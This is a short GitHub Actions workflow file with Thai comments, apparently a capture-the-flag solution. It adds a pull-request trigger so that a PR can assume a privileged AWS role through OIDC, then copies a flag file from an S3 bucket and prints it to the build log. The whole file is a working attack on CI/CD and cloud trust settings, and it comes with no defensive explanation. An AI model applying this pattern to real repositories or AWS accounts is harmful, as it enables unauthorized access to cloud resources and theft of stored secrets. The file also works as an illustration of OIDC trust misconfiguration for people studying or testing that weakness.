name: Get The Flag (via Pull Request)

on:
  push:
    branches: [ main ]
  pull_request:  # <-- 1. ผมเพิ่มบรรทัดนี้เพื่อ Trigger จาก PR
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Assume Target AWS Role
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
        role-session-name: Hacker-Session-${{ github.run_id }}
        aws-region: "ap-southeast-1"

    # 2. ผมเปลี่ยนขั้นตอนนี้ให้พิมพ์ Flag ออกมาเลย
    - name: Steal and Print the Full Flag
      run: |
        echo "Attempting to read the secret flag from S3..."
        aws s3 cp s3://oh-i-really-do-care/flag.txt .
        echo "--- FLAG CONTENT ---"
        cat flag.txt 
        echo "--- END FLAG ---"

    # เราไม่ต้องการขั้นตอน Deploy ที่เหลือ...
